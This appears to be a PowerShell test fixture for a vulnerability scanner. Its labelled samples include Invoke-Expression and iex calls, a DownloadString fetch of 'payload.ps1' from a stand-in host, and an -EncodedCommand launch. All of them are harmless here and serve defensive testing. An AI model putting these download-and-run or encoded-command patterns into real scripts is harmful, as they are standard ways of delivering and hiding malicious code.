# test_target.ps1 - contains examples of suspicious code patterns for testing the vuln scanner

# benign line
Write-Host "This is a harmless line"

# suspicious: invoke-expression
$cmd = "Write-Host 'Hello'"
Invoke-Expression $cmd

# suspicious: iex alias
iex "Get-Process | Out-String"

# suspicious: download string
$u = 'http://example.com/payload.ps1'
((New-Object Net.WebClient).DownloadString($u))

# suspicious: start-process with powershell -EncodedCommand (simulated)
Start-Process powershell -ArgumentList '-EncodedCommand','SGVsbG8=' -NoNewWindow

# suspicious obfuscation-like
$parts = 'H','e','l','l','o'
$joined = $parts -join ''
Write-Host $joined
